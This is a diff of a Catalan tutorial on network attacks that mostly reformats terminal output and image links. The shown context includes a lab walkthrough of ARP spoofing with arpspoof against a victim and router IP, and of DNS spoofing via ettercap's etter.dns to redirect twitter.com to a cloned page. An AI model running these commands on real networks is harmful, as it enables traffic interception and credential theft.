@@ -116,8 +116,8 @@ Quan xateges amb el teu amic en mode “text clar”, és possible olorar el teu
 
 Sé que saps què és una adreça IP (Protocol d'Internet).  Com saps, per comunicar-se amb altres ordinadors, cada ordinador necessita una IP.  En aquest atac, un atacant vol fer una adreça de destinació falsa i enganyar-te sobre això.  Per exemple, el teu objectiu és mibanco.com i un atacant reenvia la teva petició a un fals mibanco.com.  L'objectiu és suplantar el host víctima.
 
-![](https://cdn.imghaste.com/esgeeks.com/media/2021/04/Suplantacion-de-IP.jpg?webp=true&v=1.0.1)
-> __Img Source__: *https://cdn.imghaste.com/esgeeks.com/media/2021/04/Suplantacion-de-IP.jpg?webp=true&v=1.0.1*
+![](https://cdn.imghaste.com/esgeeks.com/media/2021/04/Suplantacion-de-IP.jpg)
+> __Img Source__: *https://cdn.imghaste.com/esgeeks.com/media/2021/04/Suplantacion-de-IP.jpg*
 <br>
 
 ## __Atac de denegació de servei (DoS)__
@@ -219,10 +219,12 @@ S'ha de canviar el contigut del fitxer etter.dns per a que twitter.com apunto a 
 
 `locate etter.dns`
 
-┌──(root㉿osboxes)-[/home/anonymous]
-└─# locate etter.dns
+```
+(root@osboxes)-[/home/anonymous]
+# locate etter.dns
 /etc/ettercap/etter.dns
 /usr/share/ettercap/etter.dns.examples
+```
 
 `cp /etc/ettercap/etter.dns /etc/ettercap/etter.dns.original`
 
@@ -313,9 +315,11 @@ Pàgina clonada: http://www.twitter.com
 SPOOF del tràfic entre la VÍCTIMA I EL ROUTER --> ES CANVIA LA MAC DEL CLIENT VICTIMA PER LA MEVA: 18:c0:4d:a0:8f:c8 PER LA MEVA (ATACANT): 08:00:27:16:51:52.
 
 EN REALITAT QUI CONECTA AMB EL SERVIDOR, SOC JO NO LA VÍCTIMA. FEM LA TORNADA.
- 
-└─# arpspoof -i eth0 -t 10.200.243.212 10.200.243.1
+
+``` 
+# arpspoof -i eth0 -t 10.200.243.212 10.200.243.1
 8:0:27:16:51:52 18:c0:4d:a0:8f:c8 0806 42: arp reply 10.200.243.1 is-at 8:0:27:16:51:52
+```
 
 "Tot el fluxe que va del servidor a la víctima, redirigeix-los a la meva màquina"
 
@@ -325,10 +329,12 @@ SPOOF del tràfic entre la EL ROUTER I LA VICTIMA --> ES CANVIA LA MAC DEL DEL R
 
 EN REALITAT QUI CONECTA AMB EL SERVIDOR, SOC JO NO LA VÍCTIMA. FEM LA TORNADA.
 
-┌──(root㉿osboxes)-[/home/anonymous]
-└─# arpspoof -i eth0 -t 10.200.243.1 10.200.243.212
+```
+(root@osboxes)-[/home/anonymous]
+# arpspoof -i eth0 -t 10.200.243.1 10.200.243.212
 8:0:27:16:51:52 0:22:57:be:53:1 0806 42: arp reply 10.200.243.212 is-at 8:0:27:16:51:52
 8:0:27:16:51:52 0:22:57:be:53:1 0806 42: arp reply 10.200.243.212 is-at 8:0:27:16:51:52
+```
 
 "Tot el fluxe que va de la víctima al servidor, redirigeix-los a la meva màquina"
 
